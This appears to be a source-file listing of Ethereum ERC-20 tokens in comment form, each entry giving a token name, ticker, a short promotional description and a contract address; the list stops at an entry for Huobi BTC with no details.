// CarLive Chain is a vertical application of blockchain technology in the field of vehicle networking. It provides services to 1.3 billion vehicle users worldwide and the trillion-dollar-scale automobile consumer market.
// 0x0e69d0a2bbb30abcb7e5cfea0e4fde19c00a8d47

// Cardstack (CARD)
// The experience layer of the decentralized internet.
// 0x954b890704693af242613edef1b603825afcd708

// ZBToken (ZB)
// Blockchain assets financial service provider.
// 0xbd0793332e9fb844a52a205a233ef27a5b34b927

// Cashaa (CAS)
// We welcome Crypto Businesses! We know crypto-related businesses are underserved by banks. Our goal is to create a hassle-free banking experience for ICO-backed companies, exchanges, wallets, and brokers. Come and discover the world of crypto-friendly banking.
// 0xe8780b48bdb05f928697a5e8155f672ed91462f7

// ArcBlock (ABT)
// An open source protocol that provides an abstract layer for accessing underlying blockchains, enabling your application to work on different blockchains.
// 0xb98d4c97425d9908e66e53a6fdf673acca0be986

// POA ERC20 on Foundation (POA20)
// POA Network is an Ethereum-based platform that offers an open-source framework for smart contracts.
// 0x6758b7d441a9739b98552b373703d8d3d14f9e62

// Rubic (RBC)
// Rubic is a multichain DEX aggregator, with instant & cross-chain swaps for Ethereum, BSC, Polygon, Harmony, Tron & xDai, limit orders, fiat on-ramps, and more. The aim of the project is to deliver a complete one-stop full circle decentralized trading platform.
// 0xa4eed63db85311e22df4473f87ccfc3dadcfa3e3

// BTU Protocol (BTU)
// Decentralized Booking Protocol
// 0xb683d83a532e2cb7dfa5275eed3698436371cc9f

// PAID Network (PAID)
// PAID Network is a business toolkit that encompassing SMART Agreements, escrow, reputation-scoring, dispute arbitration and resolution.
// 0x1614f18fc94f47967a3fbe5ffcd46d4e7da3d787

// SENTinel (SENT)
// A modern VPN backed by blockchain anonymity and security.
// 0xa44e5137293e855b1b7bc7e2c6f8cd796ffcb037

// Smart Advertising Transaction Token (SATT)
// SaTT is a new alternative of Internet Ads. Announcers and publishers meet up in a Dapp which acts as an escrow, get neutral metrics and pay fairly publishers.
// 0xdf49c9f599a0a9049d97cff34d0c30e468987389

// Gelato Network Token (GEL)
// Automated smart contract executions on Ethereum.
// 0x15b7c0c907e4c6b9adaaaabc300c08991d6cea05

// Exeedme (XED)
// Exeedme aims to build a trusted Play2Earn blockchain-powered gaming platform where all gamers can make a living doing what they love the most: Playing videogames.
// 0xee573a945b01b788b9287ce062a0cfc15be9fd86

// Stratos Token (STOS)
// Stratos is a decentralized data architecture that provides scalable, reliable, self-balanced storage, database and computation network and offers a solid foundation for data processing.
// 0x08c32b0726c5684024ea6e141c50ade9690bbdcc

// O3 Swap Token (O3)
// O3 Swap is a cross-chain aggregation protocol that enables free trading of native assets between heterogeneous chains, by deploying 'aggregator + asset cross-chain pool' on different public chains and Layer2, provides users to enable cross-chain transactions with one click.
// 0xee9801669c6138e84bd50deb500827b776777d28

// CACHE Gold (CGT)
// CACHE Gold tokens each represent one gram of pure gold stored in vaults around the world. CACHE Gold tokens are redeemable for delivery of physical gold or can be sold for fiat currency.
// 0xf5238462e7235c7b62811567e63dd17d12c2eaa0

// Sentivate (SNTVT)
// A revolutionary new Internet with a hybrid topology consisting of centralized & decentralized systems. The network is designed to go beyond the capabilities of any solely centralized or decentralized one.
// 0x7865af71cf0b288b4e7f654f4f7851eb46a2b7f8

// TokenClub Token (TCT)
// TokenClub, a blockchain-based cryptocurrency investment service community
// 0x4824a7b64e3966b0133f4f4ffb1b9d6beb75fff7

// Walton (WTC)
// Value Internet of Things (VIoT) constructs a perfect commercial ecosystem via the integration of the real world and the blockchain.
// 0xb7cb1c96db6b22b0d3d9536e0108d062bd488f74

// Populous (PPT)
// Aims to rebuild invoice financing block by block, for invoice buyers and sellers.
// 0xd4fa1460f537bb9085d22c7bccb5dd450ef28e3a

// StakeWise (SWISE)
// StakeWise is a liquid Ethereum staking protocol that tokenizes users' deposits and staking rewards as sETH2 (deposit token) and rETH2 (reward token).
// 0x48c3399719b582dd63eb5aadf12a40b4c3f52fa2

// NFTrade Token (NFTD)
// NFTrade is a cross-chain and blockchain-agnostic NFT platform. They are an aggregator of all NFT marketplaces and host the complete NFT lifecycle, allowing anyone to seamlessly create, buy, sell, swap, farm, and leverage NFTs across different blockchains.
// 0x8e0fe2947752be0d5acf73aae77362daf79cb379

// ZMINE Token (ZMN)
// ZMINE Token will be available for purchasing and exchanging for GPUs and use our mining services.
// 0x554ffc77f4251a9fb3c0e3590a6a205f8d4e067d

// InsurAce (INSUR)
// InsurAce is a decentralized insurance protocol, aiming to provide reliable, robust, and carefree DeFi insurance services to DeFi users, with a low premium and sustainable investment returns.
// 0x544c42fbb96b39b21df61cf322b5edc285ee7429

// IceToken (ICE)
// Popsicle finance is a next-gen cross-chain liquidity provider (LP) yield optimization platform
// 0xf16e81dce15b08f326220742020379b855b87df9

// EligmaToken (ELI)
// Eligma is a cognitive commerce platform aiming to create a user-friendly and safe consumer experience with AI and blockchain technology. One of its features is Elipay, a cryptocurrency transaction system.
// 0xc7c03b8a3fc5719066e185ea616e87b88eba44a3

// PolkaFoundry (PKF)
// PolkaFoundry is a platform for making DeFi dapps on Polkadot ecosystem. It comes with some DeFi-friendly services and intergrates with external ones to facilitate the creation of dapps.
// 0x8b39b70e39aa811b69365398e0aace9bee238aeb

// DaTa eXchange Token (DTX)
// As a decentralized marketplace for IoT sensor data using Blockchain technology, Databroker DAO enables sensor owners to turn generated data into revenue streams.
// 0x765f0c16d1ddc279295c1a7c24b0883f62d33f75

// Raiden (RDN)
// The Raiden Network is an off-chain scaling solution, enabling near-instant, low-fee and scalable payments. It’s complementary to the Ethereum blockchain and works with any ERC20 compatible token.
// 0x255aa6df07540cb5d3d297f0d0d4d84cb52bc8e6

// Oraichain Token (ORAI)
// Oraichain is a data oracle platform that aggregates and connects Artificial Intelligence APIs to smart contracts and regular applications.
// 0x4c11249814f11b9346808179cf06e71ac328c1b5

// Atomic Wallet Token (AWC)
// Immutable. Trustless. Distributed. Multi-asset custody-free Wallet with Atomic Swap exchange and decentralized orderbook. Manage your crypto assets in a way Satoshi would use.
// 0xad22f63404f7305e4713ccbd4f296f34770513f4

// Bread (BRD)
// BRD is the simple and secure bitcoin wallet.
// 0x558ec3152e2eb2174905cd19aea4e34a23de9ad6

// VesperToken (VSP)
// Vesper provides a suite of yield-generating products, focused on accessibility, optimization, and longevity.
// 0x1b40183efb4dd766f11bda7a7c3ad8982e998421

// Hop (HOP)
// Hop is a scalable rollup-to-rollup general token bridge. It allows users to send tokens from one rollup or sidechain to another almost immediately without having to wait for the networks challenge period.
// 0xc5102fe9359fd9a28f877a67e36b0f050d81a3cc

// ProBit Token (PROB)
// Global and secure marketplace for digital assets.
// 0xfb559ce67ff522ec0b9ba7f5dc9dc7ef6c139803

// Symbiosis (SIS)
// Symbiosis Finance is a multi-chain liquidity protocol that aggregates exchange liquidity. The SIS token is used as a governance token of Symbiosis DAO and Treasury. Relayers network nodes have to stake SIS to participate in consensus and process swaps.
// 0xd38bb40815d2b0c2d2c866e0c72c5728ffc76dd9

// QunQunCommunities (QUN)
// Incentive community platform based on blockchain technology.
// 0x264dc2dedcdcbb897561a57cba5085ca416fb7b4

// Polkamon (PMON)
// Collect Ultra-Rare Digital Monsters - Grab $PMON & experience the thrill of unveiling ultra-rare digital monsters only you can truly own!
// 0x1796ae0b0fa4862485106a0de9b654efe301d0b2

// BLOCKv (VEE)
// Create and Public Digital virtual goods on the blockchain
// 0x340d2bde5eb28c1eed91b2f790723e3b160613b7

// UnFederalReserveToken (eRSDL)
// unFederalReserve is a banking SaaS company built on blockchain technology. Our banking products are designed for smaller U.S. Treasury chartered banks and non-bank lenders in need of greater liquidity without sacrificing security or compliance.
// 0x5218E472cFCFE0b64A064F055B43b4cdC9EfD3A6

// Block-Chain.com Token (BC)
// Block-chain.com is the guide to the world of blockchain and cryptocurrency.
// 0x2ecb13a8c458c379c4d9a7259e202de03c8f3d19

// Poolz Finance (POOLZ)
// Poolz is a decentralized swapping protocol for cross-chain token pools, auctions, as well as OTC deals. The core code is optimized for DAO ecosystems, enabling startups and project owners to bootstrap liquidity before listing.
// 0x69A95185ee2a045CDC4bCd1b1Df10710395e4e23

// Hegic (HEGIC)
// Hegic is an on-chain peer-to-pool options trading protocol built on Ethereum.
// 0x584bC13c7D411c00c01A62e8019472dE68768430

// Pendle (PENDLE)
// Pendle is essentially a protocol for tokenizing yield and an AMM for trading tokenized yield and other time-decaying assets.
// 0x808507121b80c02388fad14726482e061b8da827

// Amber (AMB)
// Combining high-tech sensors, blockchain protocol and smart contracts, we are building a universally verifiable, community-driven ecosystem to assure the quality, safety & origins of products.
// 0x4dc3643dbc642b72c158e7f3d2ff232df61cb6ce

// nDEX (NDX)
// nDEX Network is a next generation decentralized ethereum token exchange. Our primary goal is to provide a clean, fast and secure trading environment with lowest service charge.
// 0x1966d718a565566e8e202792658d7b5ff4ece469

// RED MWAT (MWAT)
// RED-F is a tokenized franchise offer on the European Union energy market, that allows anyone to create and operate their own retail energy business and earn revenues.
// 0x6425c6be902d692ae2db752b3c268afadb099d3b

// Smart MFG (MFG)
// Smart MFG (MFG) is an ERC20 cryptocurrency token issued by Smart MFG for use in supply chain and manufacturing smart contracts. MFG can be used for RFQ (Request for Quote) incentives, securing smart contract POs (Purchase Orders), smart payments, hardware tokenization & NFT marketplace services.
// 0x6710c63432a2de02954fc0f851db07146a6c0312

// dHedge DAO Token (DHT)
// dHEDGE is a decentralized asset management protocol connecting investment managers with investors on the Ethereum blockchain in a permissionless, trustless fashion.
// 0xca1207647Ff814039530D7d35df0e1Dd2e91Fa84

// Geeq (GEEQ)
// Geeq is a multi-blockchain platform secured by our Proof of Honesty protocol (PoH), safe enough for your most valuable data, cheap enough for IoT, and flexible enough for any use.
// 0x6B9f031D718dDed0d681c20cB754F97b3BB81b78

// PCHAIN (PAI)
// Native multichain system in the world that supports Ethereum Virtual Machine (EVM), which consists of one main chain and multiple derived chains.
// 0xb9bb08ab7e9fa0a1356bd4a39ec0ca267e03b0b3

// ChangeNOW (NOW)
// ChangeNow is a fast and easy exchange service that provides simple cryptocurrency swaps without the annoying need to sign up for anything.
// 0xe9a95d175a5f4c9369f3b74222402eb1b837693b

// Offshift (XFT)
// Pioneering #PriFi with the world’s Private Derivatives Platform. 1:1 Collateralization, Zero slippage, Zero liquidations. #zkAssets are here.
// 0xabe580e7ee158da464b51ee1a83ac0289622e6be

// Quantum (QAU)
// Quantum aims to be a deflationary currency.
// 0x671abbe5ce652491985342e85428eb1b07bc6c64

// DAPSTOKEN (DAPS)
// The DAPS project plans to create the world's first fully private blockchain that also maintains the 'Trustless' structure of traditional public blockchains.
// 0x93190dbce9b9bd4aa546270a8d1d65905b5fdd28

// GOVI (GOVI)
// CVI is created by computing a decentralized volatility index from cryptocurrency option prices together with analyzing the market’s expectation of future volatility.
// 0xeeaa40b28a2d1b0b08f6f97bb1dd4b75316c6107

// Fractal Protocol Token (FCL)
// The Fractal Protocol is an open-source protocol designed to rebalance the incentives that make a free and open Web work for all. It builds a new equilibrium that respects user privacy, rewards content creators, and protects advertisers from fraud.
// 0xf4d861575ecc9493420a3f5a14f85b13f0b50eb3

// BHPCash (BHPC)
// Distributed bank based on bitcoin hash power credit, offers innovative service of receiving dividend from mining and multiple derivative financial services on the basis of mining hash power.
// 0xee74110fb5a1007b06282e0de5d73a61bf41d9cd

// Nerve Network (NVT)
// NerveNetwork is a decentralized digital asset service network based on the NULS micro-services framework.
// 0x7b6f71c8b123b38aa8099e0098bec7fbc35b8a13

// Spice (SFI)
// Saffron is an asset collateralization platform where liquidity providers have access to dynamic exposure by selecting customized risk and return profiles.
// 0xb753428af26e81097e7fd17f40c88aaa3e04902c

// GHOST (GHOST)
// GHOST is a Proof of Stake privacy coin to help make you nothing but a 'ghost' when transacting online!
// 0x4c327471C44B2dacD6E90525f9D629bd2e4f662C

// Torum (XTM)
// Torum is a SocialFi ecosystem (Social, NFT,DeFi, Metaverse) that is specially designed to connect cryptocurrency users.
// 0xcd1faff6e578fa5cac469d2418c95671ba1a62fe

// PolkaBridge (PBR)
// PolkaBridge offers a decentralized bridge that connects Polkadot platform and other blockchains.
// 0x298d492e8c1d909d3f63bc4a36c66c64acb3d695

// AurusDeFi (AWX)
// AurusDeFi (AWX) is a revenue-sharing token limited to a total supply of 30 million tokens. AWX entitles its holders to receive 50% of the revenues generated from AurusGOLD (AWG), and 30% from both AurusSILVER (AWS) and AurusPLATINUM (AWP), paid out in AWG, AWS, and AWP.
// 0xa51fc71422a30fa7ffa605b360c3b283501b5bf6

// Darwinia Network Native Token (RING)
// Darwinia Network provides game developers the scalability, cross-chain interoperability, and NFT identifiability, with seamless integrations to Polkadot, bridges to all major blockchains, and on-chain RNG services
// 0x9469d013805bffb7d3debe5e7839237e535ec483

// MCDEX Token (MCB)
// Monte Carlo Decentralized Exchange is a crypto trading platform. MCDEX is powered by the Mai Protocol smart contracts deployed on the Ethereum blockchain. The Mai Protocol smart contracts are fully audited by Open Zeppelin, Consensys, and Chain Security.
// 0x4e352cF164E64ADCBad318C3a1e222E9EBa4Ce42

// SPANK (SPANK)
// A cryptoeconomic powered adult entertainment ecosystem built on the Ethereum network.
// 0x42d6622dece394b54999fbd73d108123806f6a18

// Nebulas (NAS)
// Decentralized Search Framework
// 0x5d65D971895Edc438f465c17DB6992698a52318D

// LAtoken (LA)
// LATOKEN aims to transform access to capital, and enables cryptocurrencies to be widely used in the real economy by making real assets tradable in crypto.
// 0xe50365f5d679cb98a1dd62d6f6e58e59321bcddf

// Tokenomy (TEN)
// Blockchain Project Launchpad & Token Exchange
// 0xdd16ec0f66e54d453e6756713e533355989040e4

// EVAI.IO (EVAI)
// Evai is a decentralised autonomous organisation (DAO) presenting a world-class decentralised ratings platform for crypto, DeFi and NFT-based assets that can be used by anyone to evaluate these new asset classes.
// 0x50f09629d0afdf40398a3f317cc676ca9132055c

// Jarvis Reward Token (JRT)
// Jarvis is a non-custodial financial ecosystem which allows you to manage your assets, from payment to savings, trade any financial markets with any collateral and access any Dapps.
// 0x8a9c67fee641579deba04928c4bc45f66e26343a

// Dentacoin (Dentacoin)
// Aims to be the blockchain solution for the global dental industry.
// 0x08d32b0da63e2C3bcF8019c9c5d849d7a9d791e6

// MetaGraphChain (BKBT)
// Value Discovery Platform of Block Chain & Digital Currencies Based On Meta-graph Chain
// 0x6a27348483d59150ae76ef4c0f3622a78b0ca698

// QuadrantProtocol (eQUAD)
// Quadrant is a blockchain-based protocol that enables the access, creation, and distribution of data products and services with authenticity and provenance at its core.
// 0xc28e931814725bbeb9e670676fabbcb694fe7df2

// BABB BAX (BAX)
// Babb is a financial blockchain platform based in London that aims to bring accessible financial services for the unbanked and under-banked globally.
// 0xf920e4F3FBEF5B3aD0A25017514B769bDc4Ac135

// All Sports Coin (SOC)
// All Sports public blockchain hopes to fill in the blank of blockchain application in sports industry through blockchain technology.
// 0x2d0e95bd4795d7ace0da3c0ff7b706a5970eb9d3

// Deri (DERI)
// Deri is a decentralized protocol for users to exchange risk exposures precisely and capital-efficiently. It is the DeFi way to trade derivatives: to hedge, to speculate, to arbitrage, all on chain.
// 0xa487bf43cf3b10dffc97a9a744cbb7036965d3b9

// BIXToken (BIX)
// A digital asset exchange platform. It aims to stabilize transactions and simplify operations by introducing AI technology to digital asset exchange.
// 0x009c43b42aefac590c719e971020575974122803

// BiFi (BiFi)
// BiFi is a multichain DeFi project powered by Bifrost. BiFi will offer multichain wallet, lending, borrowing, staking services, and other financial investments products.
// 0x2791bfd60d232150bff86b39b7146c0eaaa2ba81

// Covesting (COV)
// Covesting is a fully licensed distributed ledger technology (DLT) services provider incorporated under the laws of Gibraltar. We develop innovative trading tools to service both retail and institutional customers in the cryptocurrency space.
// 0xADA86b1b313D1D5267E3FC0bB303f0A2b66D0Ea7

// VALID (VLD)
// Authenticate online using your self-sovereign eID and start monetizing your anonymized personal data.
// 0x922ac473a3cc241fd3a0049ed14536452d58d73c

// iQeon (IQN)
// decentralized PvP gaming platform integrating games, applications and services based on intelligent competitions between users created to help players monetize their in-gaming achievements.
// 0x0db8d8b76bc361bacbb72e2c491e06085a97ab31

// Mallcoin Token (MLC)
// An international e-commerce site created for users from all over the world, who sell and buy various products and services with tokens.
// 0xc72ed4445b3fe9f0863106e344e241530d338906

// Knoxstertoken (FKX)
// FortKnoxster is a cybersecurity company specializing in safeguarding digital assets. Our innovations, security, and service are extraordinary, and we help secure and futureproof the FinTech and Blockchain space.
// 0x16484d73Ac08d2355F466d448D2b79D2039F6EBB

// DappRadar (RADAR)
// DappRadar aims to be one of the leading global NFT & DeFi DAPP store.
// 0x44709a920fccf795fbc57baa433cc3dd53c44dbe

// KleeKai (KLEE)
// KleeKai was launched as a meme coin, however now sports an addictive game 'KleeRun' a P2E game that is enjoyable for all ages. This token was a fair launch and rewards all holders with a 2% reflection feature that redistributes tokens among the holders every Buy, Swap & Sell.
// 0xA67E9F021B9d208F7e3365B2A155E3C55B27de71

// Six Domain Asset (SDA)
// SixDomainChain (SDChain) is a decentralized public blockchain ecosystem that integrates international standards of IoT Six-Domain Model and reference architecture standards for distributed blockchain.
// 0x4212fea9fec90236ecc51e41e2096b16ceb84555

// TOKPIE (TKP)
// Tokpie is the First Cryptocurrency Exchange with BOUNTY STAKES TRADING. TKP holders can get 500% discount on fees, 70% referral bonus, access to the bounty stakes depositing, regular airdrops and altcoins of promising projects, P2P loans with 90% LTV and income from TKP token staking (lending).
// 0xd31695a1d35e489252ce57b129fd4b1b05e6acac

// Partner (PRC)
// Pipelines valve production.
// 0xcaa05e82bdcba9e25cd1a3bf1afb790c1758943d

// Blockchain Monster Coin (BCMC)
// Blockchain Monster Hunt (BCMH) is the world’s first multi-chain game that runs entirely on the blockchain itself. Inspired by Pokémon-GO, BCMH allows players to continuously explore brand-new places on the blockchain to hunt and battle monsters.
// 0x2BA8349123de45E931a8C8264c332E6e9CF593F9

// Free Coin (FREE)
// Social project to promote cryptocurrency usage and increase global wealth
// 0x2f141ce366a2462f02cea3d12cf93e4dca49e4fd

// LikeCoin (LIKE)
// LikeCoin aims to reinvent the Like by realigning creativity and reward. We enable attribution and cross-application collaboration on creative contents
// 0x02f61fd266da6e8b102d4121f5ce7b992640cf98

// IOI Token (IOI)
// QORPO aims to develop a complete ecosystem that cooperates together well, and one thing that ties it all together is IOI Token.
// 0x8b3870df408ff4d7c3a26df852d41034eda11d81

// Pawthereum (PAWTH)
// Pawthereum is a cryptocurrency project with animal welfare charitable fundamentals at its core. It aims to give back to animal shelters and be a digital advocate for animals in need.
// 0xaecc217a749c2405b5ebc9857a16d58bdc1c367f


// Furucombo (COMBO)
// Furucombo is a tool built for end-users to optimize their DeFi strategy simply by drag and drop. It visualizes complex DeFi protocols into cubes. Users setup inputs/outputs and the order of the cubes (a “combo”), then Furucombo bundles all the cubes into one transaction and sends them out.
// 0xffffffff2ba8f66d4e51811c5190992176930278


// Xaurum (Xaurum)
// Xaurum is unit of value on the golden blockchain, it represents an increasing amount of gold and can be exchanged for it by melting
// 0x4DF812F6064def1e5e029f1ca858777CC98D2D81
	

// Plasma (PPAY)
// PPAY is designed as the all-in-one defi service token combining access, rewards, staking and governance functions.
// 0x054D64b73d3D8A21Af3D764eFd76bCaA774f3Bb2

// Digg (DIGG)
// Digg is an elastic bitcoin-pegged token and governed by BadgerDAO.
// 0x798d1be841a82a273720ce31c822c61a67a601c3


// OriginSport Token (ORS)
// A blockchain based sports betting platform
// 0xeb9a4b185816c354db92db09cc3b50be60b901b6


// WePower (WPR)
// Blockchain Green energy trading platform
// 0x4CF488387F035FF08c371515562CBa712f9015d4


// Monetha (MTH)
// Trusted ecommerce.
// 0xaf4dce16da2877f8c9e00544c93b62ac40631f16


// BitSpawn Token (SPWN)
// Bitspawn is a gaming blockchain protocol aiming to give gamers new revenue streams.
// 0xe516d78d784c77d479977be58905b3f2b1111126

// NEXT (NEXT)
// A hybrid exchange registered as an N. V. (Public company) in the Netherlands and provides fiat pairs to all altcoins on its platform
// 0x377d552914e7a104bc22b4f3b6268ddc69615be7

// UREEQA Token (URQA)
// UREEQA is a platform for Protecting, Managing and Monetizing creative work.
// 0x1735db6ab5baa19ea55d0adceed7bcdc008b3136


// Eden Coin (EDN)
// EdenChain is a blockchain platform that allows for the capitalization of any and every tangible and intangible asset such as stocks, bonds, real estate, and commodities amongst many others.
// 0x89020f0D5C5AF4f3407Eb5Fe185416c457B0e93e
	

// PieDAO DOUGH v2 (DOUGH)
// DOUGH is the PieDAO governance token. Owning DOUGH makes you a member of PieDAO. Holders are capable of participating in the DAO’s governance votes and proposing votes of their own.
// 0xad32A8e6220741182940c5aBF610bDE99E737b2D
	

// cVToken (cV)
// Decentralized car history registry built on blockchain.
// 0x50bC2Ecc0bfDf5666640048038C1ABA7B7525683


// CrowdWizToken (WIZ)
// Democratize the investing process by eliminating intermediaries and placing the power and control where it belongs - entirely into the hands of investors.
// 0x2f9b6779c37df5707249eeb3734bbfc94763fbe2


// Aluna (ALN)
// Aluna.Social is a gamified social trading terminal able to manage multiple exchange accounts, featuring a transparent social environment to learn from experts and even mirror trades. Aluna's vision is to gamify finance and create the ultimate social trading experience for a Web 3.0 world.
// 0x8185bc4757572da2a610f887561c32298f1a5748


// Gas DAO (GAS)
// Gas DAO’s purpose is simple: to be the heartbeat and voice of the Ethereum network’s active users through on and off-chain governance, launched as a decentralized autonomous organization with a free and fair initial distribution 100x bigger than the original DAO.
// 0x6bba316c48b49bd1eac44573c5c871ff02958469
	

// Hiveterminal Token (HVN)
// A blockchain based platform providing you fast and low-cost liquidity.
// 0xC0Eb85285d83217CD7c891702bcbC0FC401E2D9D


// EXRP Network (EXRN)
// Connecting the blockchains using crosschain gateway built with smart contracts.
// 0xe469c4473af82217b30cf17b10bcdb6c8c796e75

// Neumark (NEU)
// Neufund’s Equity Token Offerings (ETOs) open the possibility to fundraise on Blockchain, with legal and technical framework done for you.
// 0xa823e6722006afe99e91c30ff5295052fe6b8e32


// Bloom (BLT)
// Decentralized credit scoring powered by Ethereum and IPFS.
// 0x107c4504cd79c5d2696ea0030a8dd4e92601b82e


// IONChain Token (IONC)
// Through IONChain Protocol, IONChain will serve as the link between IoT devices, supporting decentralized peer-to-peer application interaction between devices.
// 0xbc647aad10114b89564c0a7aabe542bd0cf2c5af


// Voice Token (VOICE)
// Voice is the governance token of Mute.io that makes cryptocurrency and DeFi trading more accessible to the masses.
// 0x2e2364966267B5D7D2cE6CD9A9B5bD19d9C7C6A9


// Snetwork (SNET)
// Distributed Shared Cloud Computing Network
// 0xff19138b039d938db46bdda0067dc4ba132ec71c


// AMLT (AMLT)
// The Coinfirm AMLT token solves AML/CTF needs for cryptocurrency and blockchain-related companies and allows for the safe adoption of cryptocurrencies and blockchain by players in the traditional economy.
// 0xca0e7269600d353f70b14ad118a49575455c0f2f


// LibraToken (LBA)
// Decentralized lending infrastructure facilitating open access to credit networks on Ethereum.
// 0xfe5f141bf94fe84bc28ded0ab966c16b17490657


// GAT (GAT)
// GATCOIN aims to transform traditional discount coupons, loyalty points and shopping vouchers into liquid, tradable digital tokens.
// 0x687174f8c49ceb7729d925c3a961507ea4ac7b28


// Tadpole (TAD)
// Tadpole Finance is an open-source platform providing decentralized finance services for saving and lending. Tadpole Finance is an experimental project to create a more open lending market, where users can make deposits and loans with any ERC20 tokens on the Ethereum network.
// 0x9f7229aF0c4b9740e207Ea283b9094983f78ba04


// Hacken (HKN)
// Global Tokenized Business with Operating Cybersecurity Products.
// 0x9e6b2b11542f2bc52f3029077ace37e8fd838d7f


// DeFiner (FIN)
// DeFiner is a non-custodial digital asset platform with a true peer-to-peer network for savings, lending, and borrowing all powered by blockchain technology.
// 0x054f76beED60AB6dBEb23502178C52d6C5dEbE40
	

// XIO Network (XIO)
// Blockzero is a decentralized autonomous accelerator that helps blockchain projects reach escape velocity. Users can help build, scale, and own the next generation of decentralized projects at blockzerolabs.io.
// 0x0f7F961648aE6Db43C75663aC7E5414Eb79b5704


// Autonio (NIOX)
// Autonio Foundation is a DAO that develops decentralized and comprehensive financial technology for the crypto economy to make it easier for crypto traders to conduct trading analysis, deploy trading algorithms, copy successful traders and exchange cryptocurrencies.
// 0xc813EA5e3b48BEbeedb796ab42A30C5599b01740


// Hydro Protocol (HOT)
// A network transport layer protocol for hybrid decentralized exchanges.
// 0x9af839687f6c94542ac5ece2e317daae355493a1


// Humaniq (HMQ)
// Humaniq aims to be a simple and secure 4th generation mobile bank.
// 0xcbcc0f036ed4788f63fc0fee32873d6a7487b908


// Signata (SATA)
// The Signata project aims to deliver a full suite of blockchain-powered identity and access control solutions, including hardware token integration and a marketplace of smart contracts for integration with 3rd party service providers.
// 0x3ebb4a4e91ad83be51f8d596533818b246f4bee1


// Mothership (MSP)
// Cryptocurrency exchange built from the ground up to support cryptocurrency traders with fiat pairs.
// 0x68AA3F232dA9bdC2343465545794ef3eEa5209BD
	

// FLIP (FLP)
// FLIP CRYPTO-TOKEN FOR GAMERS FROM GAMING EXPERTS
// 0x3a1bda28adb5b0a812a7cf10a1950c920f79bcd3


// Fair Token (FAIR)
// Fair.Game is a fair game platform based on blockchain technology.
// 0x9b20dabcec77f6289113e61893f7beefaeb1990a
	

// OCoin (OCN)
// ODYSSEY’s mission is to build the next-generation decentralized sharing economy & Peer to Peer Ecosystem.
// 0x4092678e4e78230f46a1534c0fbc8fa39780892b


// Zloadr Token (ZDR)
// A fully-transparent crypto due diligence token provides banks, investors and financial institutions with free solid researched information; useful and reliable when providing loans, financial assistance or making investment decisions on crypto-backed properties and assets.
// 0xbdfa65533074b0b23ebc18c7190be79fa74b30c2

// Unimex Network (UMX)
// UniMex is a Uniswap based borrowing platform which facilitates the margin trading of native Uniswap assets.
// 0x10be9a8dae441d276a5027936c3aaded2d82bc15


// Vibe Coin (VIBE)
// Crypto Based Virtual / Augmented Reality Marketplace & Hub.
// 0xe8ff5c9c75deb346acac493c463c8950be03dfba
	

// Gro DAO Token (GRO)
// Gro is a stablecoin yield optimizer that enables leverage and protection through risk tranching. It splits yield and risk into two symbiotic products; Gro Vault and PWRD Stablecoin.
// 0x3ec8798b81485a254928b70cda1cf0a2bb0b74d7


// Zippie (ZIPT)
// Zippie enables your business to send and receive programmable payments with money and other digital assets like airtime, loyalty points, tokens and gift cards.
// 0xedd7c94fd7b4971b916d15067bc454b9e1bad980


// Sharpay (S)
// Sharpay is the share button with blockchain profit
// 0x96b0bf939d9460095c15251f71fda11e41dcbddb


// Bundles (BUND)
// Bundles is a DEFI project that challenges token holders against each other to own the most $BUND.
// 0x8D3E855f3f55109D473735aB76F753218400fe96


// ATN (ATN)
// ATN is a global artificial intelligence API marketplace where developers, technology suppliers and buyers come together to access and develop new and innovative forms of A.I. technology.
// 0x461733c17b0755ca5649b6db08b3e213fcf22546


// Empty Set Dollar (ESD)
// ESD is a stablecoin built to be the reserve currency of decentralized finance.
// 0x36F3FD68E7325a35EB768F1AedaAe9EA0689d723
 

// renDOGE (renDOGE)
// renDOGE is a one-for-one representation of Dogecoin (DOGE) on Ethereum via RenVM.
// 0x3832d2F059E55934220881F831bE501D180671A7


// BOB Token (BOB)
// Using Blockchain to eliminate review fraud and provide lower pricing in the home repair industry through a decentralized platform.
// 0xDF347911910b6c9A4286bA8E2EE5ea4a39eB2134

// OKB (OKB)
// Digital Asset Exchange
// 0x75231f58b43240c9718dd58b4967c5114342a86c

// Chain (XCN)
// Chain is a cloud blockchain protocol that enables organizations to build better financial services from the ground up powered by Sequence and Chain Core.
// 0xa2cd3d43c775978a96bdbf12d733d5a1ed94fb18

// Uniswap (UNI)
// UNI token served as governance token for Uniswap protocol with 1 billion UNI have been minted at genesis. 60% of the UNI genesis supply is allocated to Uniswap community members and remaining for team, investors and advisors.
// 0x1f9840a85d5af5bf1d1762f925bdaddc4201f984

// VeChain (VEN)
// Aims to connect blockchain technology to the real world by as well as advanced IoT integration.
// 0xd850942ef8811f2a866692a623011bde52a462c1

// Frax (FRAX)
// Frax is a fractional-algorithmic stablecoin protocol. It aims to provide a highly scalable, decentralized, algorithmic money in place of fixed-supply assets like BTC. Additionally, FXS is the value accrual and governance token of the entire Frax ecosystem.
// 0x853d955acef822db058eb8505911ed77f175b99e

// TrueUSD (TUSD)
// A regulated, exchange-independent stablecoin backed 1-for-1 with US Dollars.
// 0x0000000000085d4780B73119b644AE5ecd22b376

// Wrapped Decentraland MANA (wMANA)
// The Wrapped MANA token is not transferable and has to be unwrapped 1:1 back to MANA to transfer it. This token is also not burnable or mintable (except by wrapping more tokens).
// 0xfd09cf7cfffa9932e33668311c4777cb9db3c9be

// Wrapped Filecoin (WFIL)
// Wrapped Filecoin is an Ethereum based representation of Filecoin.
// 0x6e1A19F235bE7ED8E3369eF73b196C07257494DE

// SAND (SAND)
// The Sandbox is a virtual world where players can build, own, and monetize their gaming experiences in the Ethereum blockchain using SAND, the platform’s utility token.
// 0x3845badAde8e6dFF049820680d1F14bD3903a5d0

// KuCoin Token (KCS)
// KCS performs as the key to the entire KuCoin ecosystem, and it will also be the native asset on KuCoin’s decentralized financial services as well as the governance token of KuCoin Community.
// 0xf34960d9d60be18cc1d5afc1a6f012a723a28811

// Compound USD Coin (cUSDC)
// Compound is an open-source protocol for algorithmic, efficient Money Markets on the Ethereum blockchain.
// 0x39aa39c021dfbae8fac545936693ac917d5e7563

// Pax Dollar (USDP)
// Pax Dollar (USDP) is a digital dollar redeemable one-to-one for US dollars and regulated by the New York Department of Financial Services.
// 0x8e870d67f660d95d5be530380d0ec0bd388289e1

// HuobiToken (HT)
// Huobi Global is a world-leading cryptocurrency financial services group.
// 0x6f259637dcd74c767781e37bc6133cd6a68aa161

// Huobi BTC (HBTC)
